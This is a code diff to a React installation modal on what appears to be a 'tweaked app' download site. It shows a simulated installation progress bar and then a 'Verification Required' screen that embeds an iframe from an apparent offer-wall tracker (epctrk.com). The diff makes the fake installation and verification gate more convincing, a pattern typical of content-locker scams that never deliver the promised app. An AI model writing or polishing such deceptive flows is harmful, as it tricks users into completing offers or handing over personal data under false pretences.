@@ -63,6 +63,8 @@ export function InstallationModal({ app, onClose }: InstallationModalProps) {
   if (!app) {
     return null;
   }
+  
+  const isComplete = progress === 100;
 
   return (
     <Dialog open={!!app} onOpenChange={(open) => !open && onClose()}>
@@ -79,34 +81,27 @@ export function InstallationModal({ app, onClose }: InstallationModalProps) {
             />
           </div>
           <DialogTitle className="text-2xl text-center font-headline">
-            Installing {app.name}
+            {isComplete ? 'Verification Required' : `Installing ${app.name}`}
           </DialogTitle>
           <DialogDescription className="text-center">
-            Follow the steps below to complete the installation.
+            {isComplete ? `To finish installing ${app.name}, please complete the final step.` : 'Your download will begin shortly.'}
           </DialogDescription>
         </DialogHeader>
         <div className="grid gap-4 py-4 px-6">
-          <div className="space-y-2">
-            <Progress value={progress} className="w-full" />
-            <p className="text-sm text-muted-foreground text-center">{status}</p>
-          </div>
-          {progress === 100 ? (
-            <div className="flex flex-col items-center justify-center text-center p-4 bg-accent rounded-lg">
-                <CheckCircle className="h-12 w-12 text-green-500 mb-2" />
-                <h3 className="font-semibold">Verification Required</h3>
-                <p className="text-sm text-muted-foreground">To finish installation, please complete a quick verification step.</p>
-            </div>
-          ) : (
-            <div className="text-sm text-muted-foreground space-y-2 rounded-lg border p-4">
-                <p>1. Tap the 'Install' button to begin.</p>
-                <p>2. Wait for the injection process to complete.</p>
-                <p>3. Follow any on-screen instructions to finalize.</p>
-                <p>4. Enjoy your tweaked app!</p>
-            </div>
+          {!isComplete && (
+            <>
+              <div className="space-y-2">
+                <Progress value={progress} className="w-full" />
+                <p className="text-sm text-muted-foreground text-center">{status}</p>
+              </div>
+              <div className="text-sm text-center text-muted-foreground space-y-2 rounded-lg border p-4">
+                  <p>Please wait while we prepare your app. This may take a moment.</p>
+              </div>
+            </>
           )}
         </div>
-        {progress === 100 ? (
-          <div className="w-full h-[300px] overflow-hidden">
+        {isComplete ? (
+          <div className="w-full h-[400px] overflow-hidden">
             <iframe
               src="https://epctrk.com/Verify4ow"
               scrolling="no"
